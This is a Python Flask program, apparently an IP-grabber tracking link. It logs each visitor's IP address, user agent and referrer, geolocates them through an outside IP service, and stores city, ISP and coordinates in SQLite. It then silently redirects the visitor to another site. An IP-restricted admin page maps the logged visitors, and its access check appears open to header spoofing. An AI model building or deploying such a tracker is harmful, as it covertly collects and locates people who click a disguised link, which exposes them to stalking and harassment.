from flask import Flask, request, redirect, render_template_string
import requests
from datetime import datetime
import threading
import sqlite3
import os
import time
from werkzeug.middleware.proxy_fix import ProxyFix

# Configuração inicial
app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

# Configuração do banco de dados
DATABASE = 'logs.db'

def init_db():
    """Inicializa o banco de dados SQLite"""
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''
        CREATE TABLE IF NOT EXISTS access_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            user_agent TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            timestamp DATETIME,
            referrer TEXT,
            latitude REAL,
            longitude REAL
        )
        ''')
        conn.commit()

def log_to_db(data):
    """Armazena os dados no banco SQLite"""
    try:
        with sqlite3.connect(DATABASE) as conn:
            conn.execute('''
            INSERT INTO access_logs (
                ip, user_agent, country, city, isp, timestamp, 
                referrer, latitude, longitude
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                data['ip'],
                data['user_agent'],
                data.get('country'),
                data.get('city'),
                data.get('isp'),
                data['timestamp'],
                data.get('referrer'),
                data.get('lat'),
                data.get('lon')
            ))
            conn.commit()
    except Exception as e:
        print(f"Erro ao salvar no banco: {e}")

def get_geo_info(ip):
    """Consulta informações geográficas do IP"""
    try:
        if ip in ['127.0.0.1', '::1']:
            return None
            
        response = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,'
            f'regionName,city,zip,lat,lon,timezone,isp,org,as,query&lang=pt-BR',
            timeout=3
        )
        
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def background_task(ip, user_agent, referrer):
    """Tarefa em segundo plano para processar dados"""
    geo_data = get_geo_info(ip)
    
    log_data = {
        'ip': ip,
        'user_agent': user_agent,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'referrer': referrer
    }
    
    if geo_data and geo_data.get('status') == 'success':
        log_data.update({
            'country': geo_data.get('country'),
            'city': geo_data.get('city'),
            'isp': geo_data.get('isp'),
            'lat': geo_data.get('lat'),
            'lon': geo_data.get('lon')
        })
    
    log_to_db(log_data)

@app.route('/')
def tracker():
    """Rota principal que coleta dados e redireciona"""
    # Coleta informações básicas
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    # Inicia processamento em segundo plano
    threading.Thread(
        target=background_task,
        args=(ip, user_agent, referrer)
    ).start()
    
    # Redirecionamento (substitua pelo seu link)
    return redirect("https://www.google.com", code=302)

@app.route('/admin', methods=['GET'])
def admin_panel():
    """Painel de administração (protegido por IP)"""
    # Verificação simples de IP (substitua pelo seu IP público)
    admin_ips = ['127.0.0.1']  # Adicione IPs autorizados
    
    if request.remote_addr not in admin_ips:
        return "Acesso não autorizado", 403
    
    # Recupera logs do banco de dados
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.execute('SELECT * FROM access_logs ORDER BY timestamp DESC LIMIT 100')
        logs = cursor.fetchall()
    
    # HTML simples para exibição
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Painel Admin</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            tr:nth-child(even) { background-color: #f9f9f9; }
        </style>
    </head>
    <body>
        <h1>Logs de Acesso</h1>
        <table>
            <tr>
                <th>Data/Hora</th>
                <th>IP</th>
                <th>Localização</th>
                <th>ISP</th>
                <th>User Agent</th>
                <th>Referrer</th>
            </tr>
            {% for log in logs %}
            <tr>
                <td>{{ log[6] }}</td>
                <td>{{ log[1] }}</td>
                <td>
                    {% if log[3] and log[4] %}
                        {{ log[4] }}, {{ log[3] }}
                        <br><a href="https://maps.google.com/?q={{ log[8] }},{{ log[9] }}" target="_blank">
                            Mapa
                        </a>
                    {% else %}
                        N/A
                    {% endif %}
                </td>
                <td>{{ log[5] or 'N/A' }}</td>
                <td>{{ log[2] }}</td>
                <td>{{ log[7] or 'Direct' }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    
    return render_template_string(html_template, logs=logs)

if __name__ == '__main__':
    # Verifica se o banco de dados existe, senão cria
    if not os.path.exists(DATABASE):
        init_db()
    
    # Configuração para o Replit
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)